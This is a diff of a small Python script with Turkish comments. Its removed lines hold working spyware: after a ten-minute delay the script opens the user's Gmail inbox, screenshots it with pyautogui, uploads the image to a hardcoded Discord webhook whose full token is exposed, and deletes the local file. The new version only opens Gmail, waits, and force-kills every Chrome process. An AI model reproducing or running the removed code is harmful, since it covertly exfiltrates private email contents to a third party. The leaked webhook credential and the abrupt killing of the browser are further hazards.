@@ -1,75 +1,12 @@
-import os
-import subprocess
 import webbrowser
 import time
-import requests
-import pyautogui
+import os
 
-# ==========================================
-# WEBHOOK URL
-# ==========================================
-WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo7IXkkVpa5gfHkfqHTnXCuRE3Iwp_D3GyJiFnivKfv0o5Z1R1xbF7PEUi"
+# 1. Gmail inbox aç
+webbrowser.open("https://mail.google.com/mail/u/0/#inbox")
 
-def send_notification(message):
-    try:
-        payload = {"content": f"**[GMAIL SS]** {message}"}
-        requests.post(WEBHOOK_URL, json=payload, timeout=5)
-    except:
-        pass
+# 2. 1 dakika bekle
+time.sleep(60)
 
-def send_photo(photo_path):
-    try:
-        with open(photo_path, "rb") as f:
-            files = {"file": f}
-            payload = {"content": "📸 Gmail Inbox ekran görüntüsü:"}
-            requests.post(WEBHOOK_URL, data=payload, files=files)
-        send_notification("✅ Fotoğraf webhook'a gönderildi!")
-    except Exception as e:
-        send_notification(f"❌ Foto gönderme hatası: {e}")
-
-# ==========================================
-# 1. 10 DAKİKA BEKLE
-# ==========================================
-send_notification("⏳ 10 dakika bekleniyor...")
-time.sleep(600)  # 10 dakika
-send_notification("⏰ 10 dakika doldu!")
-
-# ==========================================
-# 2. CHROME İLE GMAIL INBOX AÇ
-# ==========================================
-chrome_paths = [
-    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
-    "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
-]
-
-chrome = None
-for path in chrome_paths:
-    if os.path.exists(path):
-        chrome = path
-        break
-
-if chrome:
-    subprocess.Popen([chrome, "https://mail.google.com/mail/u/0/#inbox"])
-else:
-    webbrowser.open("https://mail.google.com/mail/u/0/#inbox")
-
-send_notification("🌐 Gmail açılıyor...")
-time.sleep(5)  # Sayfanın yüklenmesi için bekle
-
-# ==========================================
-# 3. EKRAN GÖRÜNTÜSÜ AL
-# ==========================================
-screenshot = pyautogui.screenshot()
-screenshot.save("gmail_inbox.png")
-send_notification("📸 Ekran görüntüsü alındı!")
-
-# ==========================================
-# 4. WEBHOOK'A GÖNDER
-# ==========================================
-send_photo("gmail_inbox.png")
-
-# ==========================================
-# 5. TEMİZLE
-# ==========================================
-os.remove("gmail_inbox.png")
-send_notification("✅ İşlem tamamlandı!")
+# 3. Chrome'u kapat (tüm sekmeleri)
+os.system('taskkill /f /im chrome.exe')
